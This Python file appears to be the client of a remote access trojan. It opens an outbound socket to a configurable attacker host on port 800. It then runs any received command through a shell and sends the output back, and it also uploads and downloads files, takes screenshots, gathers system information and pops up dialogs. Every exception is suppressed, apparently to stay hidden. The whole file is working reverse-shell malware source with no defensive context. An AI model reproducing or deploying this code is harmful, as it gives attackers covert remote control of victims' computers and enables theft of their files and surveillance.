#!/usr/bin/env python3
import os.path
import re
import socket
import subprocess
import sys

from Dialog import Dialog
from Download import Download_file
from Upload import Upload_file
from Receive import Receive
from Screenshot import ScreenShot
from Send import Send
from sysinfo import Get_info
from Validator import Validator

try:
    HOST = "[HOST]"
    PORT = 800
    BufferSize = 1024

    v = Validator()
    try:
        if v.ip(ip=str(sys.argv[1])):
            HOST = sys.argv[1]
        if v.port(port=int(sys.argv[2])):
            PORT = int(sys.argv[2])
    except (IndexError, TypeError, ValueError):
        pass

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def Shell():
        while True:
            command_reg = re.findall("\S+", Receive(client=client))

            if command_reg[0] == "disconnect":
                break
            elif command_reg[0] == "sysinfo":
                Send(client=client, data=Get_info())
            elif command_reg[0] == "cd":
                d = ' '.join(command_reg[1:])
                if os.path.exists(d) and os.path.isdir(d):
                    os.chdir(d)
            elif command_reg[0] == "upload":
                Download_file(client=client, filename=' '.join(command_reg[1:]), BufferSize=BufferSize)
            elif command_reg[0] == "download":
                Upload_file(client=client, filename=' '.join(command_reg[1:]))
            elif command_reg[0] == "screenshot":
                ScreenShot(client=client)
            elif command_reg[0] == "dialog":
                Dialog(client=client)
            else:
                execute = subprocess.Popen(' '.join(command_reg), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                result = execute.stdout.read() + execute.stderr.read()
                Send(client=client, data=result.decode(errors="ignore"))
    client.connect((HOST, PORT))
    Shell()
except Exception:
    pass